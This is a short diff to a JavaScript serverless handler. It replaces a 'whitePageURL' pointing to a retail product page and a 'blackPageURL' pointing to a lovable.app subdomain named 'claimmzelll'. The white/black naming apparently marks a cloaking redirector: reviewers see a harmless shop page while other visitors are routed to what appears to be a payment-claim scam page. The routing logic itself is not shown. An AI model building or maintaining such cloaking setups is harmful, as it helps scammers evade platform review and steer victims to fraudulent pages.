@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://purebaby.com.au/products/check-overall-multi-check";
-    const blackPageURL = "https://csshhhggot.lovable.app";
+    const whitePageURL = "https://www.calza.com.pk/collections/shoe-sale-mens-sneakers-sports-shoes/products/mens-lace-up-sneakers-cz-sn-0002-black?variant=44958372036859";
+    const blackPageURL = "https://claimmzelll.lovable.app";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
